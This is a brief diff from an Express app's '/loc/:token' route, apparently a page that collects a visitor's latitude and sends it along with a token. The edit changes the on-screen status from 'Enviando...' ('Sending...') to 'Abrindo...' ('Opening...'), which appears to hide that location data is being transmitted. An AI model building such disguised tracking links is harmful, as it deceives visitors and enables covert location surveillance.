@@ -153,7 +153,7 @@ app.get("/loc/:token", (req, res) => {
       return;
     }
 
-    out.textContent = "Enviando...";
+    out.textContent = "Abrindo...";
     const payload = {
       token: "${token}",
       lat: pos.coords.latitude,
